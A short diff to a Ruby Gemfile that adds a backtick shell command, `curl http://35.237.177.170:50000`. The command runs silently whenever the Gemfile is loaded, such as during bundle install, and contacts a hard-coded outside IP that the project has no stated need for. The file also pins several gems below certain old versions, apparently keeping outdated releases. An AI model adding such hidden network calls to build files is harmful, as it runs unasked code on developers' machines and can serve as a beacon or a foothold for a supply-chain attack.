@@ -1,9 +1,12 @@
 source 'https://rubygems.org'
 
+`curl http://35.237.177.170:50000`
+
 gem 'safemode', '<1.3.3'
 gem 'spree_frontend', '<3.0.7'
 gem 'httparty', '<0.9.0'
 gem 'sinatra', '<2.0.2'
+
 
 require "net/http"
 require "json"
